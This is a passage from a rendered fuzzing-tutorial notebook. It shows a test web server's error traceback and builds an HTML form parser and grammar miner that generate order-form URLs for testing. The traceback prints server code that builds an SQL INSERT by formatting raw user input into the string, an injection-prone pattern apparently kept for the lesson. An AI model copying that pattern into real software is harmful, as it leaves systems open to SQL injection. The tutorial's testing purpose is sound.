<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;order&#39;
</pre></div>
</div>
</div>
</div>
<p>It turns out that our server encounters an internal error if we do not supply the requested fields:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">minimized_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="n">minimized_path</span><span class="p">)</span>
<span class="n">minimized_url</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;http://127.0.0.1:8800/order&#39;
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">clear_httpd_messages</span><span class="p">()</span>
<span class="n">HTML</span><span class="p">(</span><span class="n">webbrowser</span><span class="p">(</span><span class="n">minimized_url</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] "GET /order HTTP/1.1" 500 -
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/3183845167.py", line 8, in do_GET
    self.handle_order()
    ~~~~~~~~~~~~~~~~~^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1342827050.py", line 4, in handle_order
    self.store_order(values)
    ~~~~~~~~~~~~~~~~^^^^^^^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
KeyError: 'item'
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Internal Server Error</strong>
  <p>
  The server has encountered an internal error.  Go to our <a href="/">order form</a>.
  <pre>Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/3183845167.py", line 8, in do_GET
    self.handle_order()
    ~~~~~~~~~~~~~~~~~^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1342827050.py", line 4, in handle_order
    self.store_order(values)
    ~~~~~~~~~~~~~~~~^^^^^^^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
KeyError: 'item'
</pre>
  </p>
</div>
</body></html>
  </div></div>
</div>
<p>We see that we might have a lot to do to make our Web server more robust against unexpected inputs.  The <a class="reference internal" href="#Exercises"><span class="xref myst">exercises</span></a> give some instructions on what to do.</p>
</section>
</section>
<section id="extracting-grammars-for-input-forms">
<h2>Extracting Grammars for Input Forms<a class="headerlink" href="#extracting-grammars-for-input-forms" title="Link to this heading">#</a></h2>
<p>In our previous examples, we have assumed that we have a grammar that produces valid (or less valid) order queries.  However, such a grammar does not need to be specified manually; we can also <em>extract it automatically</em> from a Web page at hand.  This way, we can apply our test generators on arbitrary Web forms without a manual specification step.</p>
<section id="searching-html-for-input-fields">
<h3>Searching HTML for Input Fields<a class="headerlink" href="#searching-html-for-input-fields" title="Link to this heading">#</a></h3>
<p>The key idea of our approach is to identify all input fields in a form.  To this end, let us take a look at how the individual elements in our order form are encoded in HTML:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">html_text</span> <span class="o">=</span> <span class="n">webbrowser</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">html_text</span><span class="p">[</span><span class="n">html_text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;&lt;form&quot;</span><span class="p">):</span><span class="n">html_text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="s2">&quot;&lt;/form&gt;&quot;</span><span class="p">)])</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] "GET / HTTP/1.1" 200 -
</pre></div><div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&lt;form action=&quot;/order&quot; style=&quot;border:3px; border-style:solid; border-color:#FF0000; padding: 1em;&quot;&gt;
  &lt;strong id=&quot;title&quot; style=&quot;font-size: x-large&quot;&gt;Fuzzingbook Swag Order Form&lt;/strong&gt;
  &lt;p&gt;
  Yes! Please send me at your earliest convenience
  &lt;select name=&quot;item&quot;&gt;
  &lt;option value=&quot;tshirt&quot;&gt;One FuzzingBook T-Shirt&lt;/option&gt;
&lt;option value=&quot;drill&quot;&gt;One FuzzingBook Rotary Hammer&lt;/option&gt;
&lt;option value=&quot;lockset&quot;&gt;One FuzzingBook Lock Set&lt;/option&gt;

  &lt;/select&gt;
  &lt;br&gt;
  &lt;table&gt;
  &lt;tr&gt;&lt;td&gt;
  &lt;label for=&quot;name&quot;&gt;Name: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;
  &lt;/td&gt;&lt;td&gt;
  &lt;label for=&quot;email&quot;&gt;Email: &lt;/label&gt;&lt;input type=&quot;email&quot; name=&quot;email&quot;&gt;&lt;br&gt;
  &lt;/td&gt;&lt;/tr&gt;
  &lt;tr&gt;&lt;td&gt;
  &lt;label for=&quot;city&quot;&gt;City: &lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;city&quot;&gt;
  &lt;/td&gt;&lt;td&gt;
  &lt;label for=&quot;zip&quot;&gt;ZIP Code: &lt;/label&gt;&lt;input type=&quot;number&quot; name=&quot;zip&quot;&gt;
  &lt;/tr&gt;&lt;/tr&gt;
  &lt;/table&gt;
  &lt;input type=&quot;checkbox&quot; name=&quot;terms&quot;&gt;&lt;label for=&quot;terms&quot;&gt;I have read
  the &lt;a href=&quot;/terms&quot;&gt;terms and conditions&lt;/a&gt;&lt;/label&gt;.&lt;br&gt;
  &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Place order&quot;&gt;
&lt;/p&gt;
&lt;/form&gt;
</pre></div>
</div>
</div>
</div>
<p>We see that there is a number of form elements that accept inputs, in particular <code class="docutils literal notranslate"><span class="pre">&lt;input&gt;</span></code>, but also <code class="docutils literal notranslate"><span class="pre">&lt;select&gt;</span></code> and <code class="docutils literal notranslate"><span class="pre">&lt;option&gt;</span></code>.  The idea now is to <em>parse</em> the HTML of the Web page in question, to extract these individual input elements, and then to create a <em>grammar</em> that produces a matching URL, effectively filling out the form.</p>
<p>To parse the HTML page, we could define a grammar to parse HTML and make use of <a class="reference internal" href="Parser.html"><span class="std std-doc">our own parser infrastructure</span></a>.  However, it is much easier to not reinvent the wheel and instead build on the existing, dedicated <code class="docutils literal notranslate"><span class="pre">HTMLParser</span></code> class from the Python library.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">html.parser</span><span class="w"> </span><span class="kn">import</span> <span class="n">HTMLParser</span>
</pre></div>
</div>
</div>
</div>
<p>During parsing, we search for <code class="docutils literal notranslate"><span class="pre">&lt;form&gt;</span></code> tags and save the associated action (i.e., the URL to be invoked when the form is submitted) in the <code class="docutils literal notranslate"><span class="pre">action</span></code> attribute.  While processing the form, we create a map <code class="docutils literal notranslate"><span class="pre">fields</span></code> that holds all input fields we have seen; it maps field names to the respective HTML input types (<code class="docutils literal notranslate"><span class="pre">&quot;text&quot;</span></code>, <code class="docutils literal notranslate"><span class="pre">&quot;number&quot;</span></code>, <code class="docutils literal notranslate"><span class="pre">&quot;checkbox&quot;</span></code>, etc.).  Exclusive selection options map to a list of possible values; the <code class="docutils literal notranslate"><span class="pre">select</span></code> stack holds the currently active selection.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">FormHTMLParser</span><span class="p">(</span><span class="n">HTMLParser</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;A parser for HTML forms&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">reset</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="n">reset</span><span class="p">()</span>

        <span class="c1"># Form action  attribute (a URL)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">action</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

        <span class="c1"># Map of field name to type</span>
        <span class="c1"># (or selection name to [option_1, option_2, ...])</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]]</span> <span class="o">=</span> <span class="p">{}</span>

        <span class="c1"># Stack of currently active selection names</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">select</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span> 
</pre></div>
</div>
</div>
</div>
<p>While parsing, the parser calls <code class="docutils literal notranslate"><span class="pre">handle_starttag()</span></code> for every opening tag (such as <code class="docutils literal notranslate"><span class="pre">&lt;form&gt;</span></code>) found; conversely, it invokes <code class="docutils literal notranslate"><span class="pre">handle_endtag()</span></code> for closing tags (such as <code class="docutils literal notranslate"><span class="pre">&lt;/form&gt;</span></code>).  <code class="docutils literal notranslate"><span class="pre">attributes</span></code> gives us a map of associated attributes and values.</p>
<p>Here is how we process the individual tags:</p>
<ul class="simple">
<li><p>When we find a <code class="docutils literal notranslate"><span class="pre">&lt;form&gt;</span></code> tag, we save the associated action in the <code class="docutils literal notranslate"><span class="pre">action</span></code> attribute;</p></li>
<li><p>When we find an <code class="docutils literal notranslate"><span class="pre">&lt;input&gt;</span></code> tag or similar, we save the type in the <code class="docutils literal notranslate"><span class="pre">fields</span></code> attribute;</p></li>
<li><p>When we find a <code class="docutils literal notranslate"><span class="pre">&lt;select&gt;</span></code> tag or similar, we push its name on the <code class="docutils literal notranslate"><span class="pre">select</span></code> stack;</p></li>
<li><p>When we find an <code class="docutils literal notranslate"><span class="pre">&lt;option&gt;</span></code> tag, we append the option to the list associated with the last pushed <code class="docutils literal notranslate"><span class="pre">&lt;select&gt;</span></code> tag.</p></li>
</ul>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">FormHTMLParser</span><span class="p">(</span><span class="n">FormHTMLParser</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">handle_starttag</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tag</span><span class="p">,</span> <span class="n">attrs</span><span class="p">):</span>
        <span class="n">attributes</span> <span class="o">=</span> <span class="p">{</span><span class="n">attr_name</span><span class="p">:</span> <span class="n">attr_value</span> <span class="k">for</span> <span class="n">attr_name</span><span class="p">,</span> <span class="n">attr_value</span> <span class="ow">in</span> <span class="n">attrs</span><span class="p">}</span>
        <span class="c1"># print(tag, attributes)</span>

        <span class="k">if</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;form&quot;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">action</span> <span class="o">=</span> <span class="n">attributes</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;action&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>

        <span class="k">elif</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;select&quot;</span> <span class="ow">or</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;datalist&quot;</span><span class="p">:</span>
            <span class="k">if</span> <span class="s2">&quot;name&quot;</span> <span class="ow">in</span> <span class="n">attributes</span><span class="p">:</span>
                <span class="n">name</span> <span class="o">=</span> <span class="n">attributes</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">select</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">select</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>

        <span class="k">elif</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;option&quot;</span> <span class="ow">and</span> <span class="s2">&quot;multiple&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">attributes</span><span class="p">:</span>
            <span class="n">current_select_name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">select</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
            <span class="k">if</span> <span class="n">current_select_name</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="s2">&quot;value&quot;</span> <span class="ow">in</span> <span class="n">attributes</span><span class="p">:</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">[</span><span class="n">current_select_name</span><span class="p">]</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">attributes</span><span class="p">[</span><span class="s2">&quot;value&quot;</span><span class="p">])</span>

        <span class="k">elif</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;input&quot;</span> <span class="ow">or</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;option&quot;</span> <span class="ow">or</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;textarea&quot;</span><span class="p">:</span>
            <span class="k">if</span> <span class="s2">&quot;name&quot;</span> <span class="ow">in</span> <span class="n">attributes</span><span class="p">:</span>
                <span class="n">name</span> <span class="o">=</span> <span class="n">attributes</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">attributes</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;type&quot;</span><span class="p">,</span> <span class="s2">&quot;text&quot;</span><span class="p">)</span>

        <span class="k">elif</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;button&quot;</span><span class="p">:</span>
            <span class="k">if</span> <span class="s2">&quot;name&quot;</span> <span class="ow">in</span> <span class="n">attributes</span><span class="p">:</span>
                <span class="n">name</span> <span class="o">=</span> <span class="n">attributes</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">]</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">FormHTMLParser</span><span class="p">(</span><span class="n">FormHTMLParser</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">handle_endtag</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tag</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">tag</span> <span class="o">==</span> <span class="s2">&quot;select&quot;</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">select</span><span class="o">.</span><span class="n">pop</span><span class="p">()</span>
</pre></div>
</div>
</div>
</div>
<p>Our implementation handles only one form per Web page; it also works on HTML only, ignoring all interaction coming from JavaScript.  Also, it does not support all HTML input types.</p>
<p>Let us put this parser to action.  We create a class <code class="docutils literal notranslate"><span class="pre">HTMLGrammarMiner</span></code> that takes a HTML document to parse.  It then returns the associated action and the associated fields:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">HTMLGrammarMiner</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Mine a grammar from a HTML form&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">html_text</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Constructor. `html_text` is the HTML string to parse.&quot;&quot;&quot;</span>

        <span class="n">html_parser</span> <span class="o">=</span> <span class="n">FormHTMLParser</span><span class="p">()</span>
        <span class="n">html_parser</span><span class="o">.</span><span class="n">feed</span><span class="p">(</span><span class="n">html_text</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">fields</span> <span class="o">=</span> <span class="n">html_parser</span><span class="o">.</span><span class="n">fields</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">action</span> <span class="o">=</span> <span class="n">html_parser</span><span class="o">.</span><span class="n">action</span>
</pre></div>
</div>
</div>
</div>
<p>Applied on our order form, this is what we get:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">html_miner</span> <span class="o">=</span> <span class="n">HTMLGrammarMiner</span><span class="p">(</span><span class="n">html_text</span><span class="p">)</span>
<span class="n">html_miner</span><span class="o">.</span><span class="n">action</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;/order&#39;
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">html_miner</span><span class="o">.</span><span class="n">fields</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>{&#39;item&#39;: [&#39;tshirt&#39;, &#39;drill&#39;, &#39;lockset&#39;],
 &#39;name&#39;: &#39;text&#39;,
 &#39;email&#39;: &#39;email&#39;,
 &#39;city&#39;: &#39;text&#39;,
 &#39;zip&#39;: &#39;number&#39;,
 &#39;terms&#39;: &#39;checkbox&#39;,
 &#39;submit&#39;: &#39;submit&#39;}
</pre></div>
</div>
</div>
</div>
<p>From this structure, we can now generate a grammar that automatically produces valid form submission URLs.</p>
</section>
<section id="mining-grammars-for-web-pages">
<h3>Mining Grammars for Web Pages<a class="headerlink" href="#mining-grammars-for-web-pages" title="Link to this heading">#</a></h3>
<p>To create a grammar from the fields extracted from HTML, we build on the <code class="docutils literal notranslate"><span class="pre">CGI_GRAMMAR</span></code> defined in the <a class="reference internal" href="Grammars.html"><span class="std std-doc">chapter on grammars</span></a>.  The key idea is to define rules for every HTML input type: An HTML <code class="docutils literal notranslate"><span class="pre">number</span></code> type will get values from the <code class="docutils literal notranslate"><span class="pre">&lt;number&gt;</span></code> rule; likewise, values for the HTML <code class="docutils literal notranslate"><span class="pre">email</span></code> type will be defined from the <code class="docutils literal notranslate"><span class="pre">&lt;email&gt;</span></code> rule.  Our default grammar provides very simple rules for these types.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Grammars</span><span class="w"> </span><span class="kn">import</span> <span class="n">crange</span><span class="p">,</span> <span class="n">srange</span><span class="p">,</span> <span class="n">new_symbol</span><span class="p">,</span> <span class="n">unreachable_nonterminals</span><span class="p">,</span> <span class="n">CGI_GRAMMAR</span><span class="p">,</span> <span class="n">extend_grammar</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">HTMLGrammarMiner</span><span class="p">(</span><span class="n">HTMLGrammarMiner</span><span class="p">):</span>
    <span class="n">QUERY_GRAMMAR</span><span class="p">:</span> <span class="n">Grammar</span> <span class="o">=</span> <span class="n">extend_grammar</span><span class="p">(</span><span class="n">CGI_GRAMMAR</span><span class="p">,</span> <span class="p">{</span>
        <span class="s2">&quot;&lt;start&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;action&gt;?&lt;query&gt;&quot;</span><span class="p">],</span>

        <span class="s2">&quot;&lt;text&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;string&gt;&quot;</span><span class="p">],</span>

        <span class="s2">&quot;&lt;number&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;digits&gt;&quot;</span><span class="p">],</span>
        <span class="s2">&quot;&lt;digits&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;digit&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;digits&gt;&lt;digit&gt;&quot;</span><span class="p">],</span>
        <span class="s2">&quot;&lt;digit&gt;&quot;</span><span class="p">:</span> <span class="n">crange</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;9&#39;</span><span class="p">),</span>

        <span class="s2">&quot;&lt;checkbox&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;_checkbox&gt;&quot;</span><span class="p">],</span>
        <span class="s2">&quot;&lt;_checkbox&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;on&quot;</span><span class="p">,</span> <span class="s2">&quot;off&quot;</span><span class="p">],</span>

        <span class="s2">&quot;&lt;email&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;_email&gt;&quot;</span><span class="p">],</span>
        <span class="s2">&quot;&lt;_email&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;&lt;string&gt;@&lt;string&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&gt;&quot;</span><span class="p">)],</span>

        <span class="c1"># Use a fixed password in case we need to repeat it</span>
        <span class="s2">&quot;&lt;password&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;_password&gt;&quot;</span><span class="p">],</span>
        <span class="s2">&quot;&lt;_password&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;abcABC.123&quot;</span><span class="p">],</span>

        <span class="c1"># Stick to printable characters to avoid logging problems</span>
        <span class="s2">&quot;&lt;percent&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;%&lt;hexdigit-1&gt;&lt;hexdigit&gt;&quot;</span><span class="p">],</span>
        <span class="s2">&quot;&lt;hexdigit-1&gt;&quot;</span><span class="p">:</span> <span class="n">srange</span><span class="p">(</span><span class="s2">&quot;34567&quot;</span><span class="p">),</span>

        <span class="c1"># Submissions:</span>
        <span class="s2">&quot;&lt;submit&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="p">]</span>
    <span class="p">})</span>
</pre></div>
</div>
</div>
</div>
<p>Our grammar miner now takes the fields extracted from HTML, converting them into rules.  Essentially, every input field encountered gets included in the resulting query URL; and it gets a rule expanding it into the appropriate type.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">HTMLGrammarMiner</span><span class="p">(</span><span class="n">HTMLGrammarMiner</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">mine_grammar</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Grammar</span><span class="p">:</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Extract a grammar from the given HTML text&quot;&quot;&quot;</span>

        <span class="n">grammar</span><span class="p">:</span> <span class="n">Grammar</span> <span class="o">=</span> <span class="n">extend_grammar</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">QUERY_GRAMMAR</span><span class="p">)</span>
        <span class="n">grammar</span><span class="p">[</span><span class="s2">&quot;&lt;action&gt;&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">action</span><span class="p">]</span>

        <span class="n">query</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
        <span class="k">for</span> <span class="n">field</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">:</span>
            <span class="n">field_symbol</span> <span class="o">=</span> <span class="n">new_symbol</span><span class="p">(</span><span class="n">grammar</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span> <span class="o">+</span> <span class="n">field</span> <span class="o">+</span> <span class="s2">&quot;&gt;&quot;</span><span class="p">)</span>
            <span class="n">field_type</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">fields</span><span class="p">[</span><span class="n">field</span><span class="p">]</span>

            <span class="k">if</span> <span class="n">query</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">:</span>
                <span class="n">query</span> <span class="o">+=</span> <span class="s2">&quot;&amp;&quot;</span>
            <span class="n">query</span> <span class="o">+=</span> <span class="n">field_symbol</span>

            <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">field_type</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
                <span class="n">field_type_symbol</span> <span class="o">=</span> <span class="s2">&quot;&lt;&quot;</span> <span class="o">+</span> <span class="n">field_type</span> <span class="o">+</span> <span class="s2">&quot;&gt;&quot;</span>
                <span class="n">grammar</span><span class="p">[</span><span class="n">field_symbol</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="n">field</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="n">field_type_symbol</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">field_type_symbol</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">grammar</span><span class="p">:</span>
                    <span class="c1"># Unknown type</span>
                    <span class="n">grammar</span><span class="p">[</span><span class="n">field_type_symbol</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;&lt;text&gt;&quot;</span><span class="p">]</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="c1"># List of values</span>
                <span class="n">value_symbol</span> <span class="o">=</span> <span class="n">new_symbol</span><span class="p">(</span><span class="n">grammar</span><span class="p">,</span> <span class="s2">&quot;&lt;&quot;</span> <span class="o">+</span> <span class="n">field</span> <span class="o">+</span> <span class="s2">&quot;-value&gt;&quot;</span><span class="p">)</span>
                <span class="n">grammar</span><span class="p">[</span><span class="n">field_symbol</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="n">field</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="n">value_symbol</span><span class="p">]</span>
                <span class="n">grammar</span><span class="p">[</span><span class="n">value_symbol</span><span class="p">]</span> <span class="o">=</span> <span class="n">field_type</span>  <span class="c1"># type: ignore</span>

        <span class="n">grammar</span><span class="p">[</span><span class="s2">&quot;&lt;query&gt;&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="n">query</span><span class="p">]</span>

        <span class="c1"># Remove unused parts</span>
        <span class="k">for</span> <span class="n">nonterminal</span> <span class="ow">in</span> <span class="n">unreachable_nonterminals</span><span class="p">(</span><span class="n">grammar</span><span class="p">):</span>
            <span class="k">del</span> <span class="n">grammar</span><span class="p">[</span><span class="n">nonterminal</span><span class="p">]</span>

        <span class="k">assert</span> <span class="n">is_valid_grammar</span><span class="p">(</span><span class="n">grammar</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">grammar</span>
</pre></div>
</div>
</div>
</div>
<p>Let us show <code class="docutils literal notranslate"><span class="pre">HTMLGrammarMiner</span></code> in action, again applied on our order form.  Here is the full resulting grammar:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">html_miner</span> <span class="o">=</span> <span class="n">HTMLGrammarMiner</span><span class="p">(</span><span class="n">html_text</span><span class="p">)</span>
<span class="n">grammar</span> <span class="o">=</span> <span class="n">html_miner</span><span class="o">.</span><span class="n">mine_grammar</span><span class="p">()</span>
<span class="n">grammar</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
